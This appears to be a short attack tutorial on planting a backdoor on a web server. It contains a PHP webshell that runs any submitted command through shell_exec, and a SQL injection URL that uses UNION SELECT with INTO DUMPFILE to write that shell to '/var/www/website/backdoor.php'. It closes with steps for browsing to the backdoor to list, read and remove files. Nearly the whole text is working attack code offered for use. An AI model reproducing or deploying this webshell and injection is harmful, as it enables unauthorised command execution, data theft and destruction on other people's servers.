
+----------------------------------------------------+
+----------------------------------------------------+
HTML style for page with command label and button.
+---------------------------------------------------+
+---------------------------------------------------+

<form action="" method="post" enctype= "application/x-www-form-urlencoded">

<table style="margin-left-auto; margin-right:auto;">
	<tr>
		<td colspan="2">Enter a Command</td>
		<td class="label">Command</td>
		<td><input type="text" name="pCommand" size="50"></td>
	</tr>
</table>

+---------------------------------+
+---------------------------------+
PHP code execute command(webshell)
+---------------------------------+
+---------------------------------+

<?php
	echo "<pre>";
	echo shell_exec($_REQUEST["pCommand"]);
	echo "</pre>";

?>

+----------------------------------------------------------------------+
+----------------------------------------------------------------------+
SQL query to upload te web shell script to the vulnerable webserver
+----------------------------------------------------------------------+
+----------------------------------------------------------------------+

http://www.yourtarget.com/page.php?id= ' ' UNION SELECT null,null,' <form action="" method="post" enctype= "application/x-www-form-urlencoded"><table style="margin-left-auto; margin-right:auto;"><tr><td colspan="2">Enter a Command</td><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr></table><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/website/backdoor.php' -- 

+------------------------------------------+
+------------------------------------------+
Query explantaion
+------------------------------------------+
+------------------------------------------+

First part is the union select with the nulls(how many nulls depends on how many columns te database has)

Second part is the page code with the HTML and php in it to upload it as context of the file.

Third part is the directory wich is most of the time for apache linux /var/www but depends the injection dump the file in the folder. (Depends on webserver).

After a succesfull inject, you can browse to http://yourtarget.com/website/backdoor.php. And start to enter commands and list,read,remove files from the webserver.

+------------------------------------------+
+------------------------------------------+

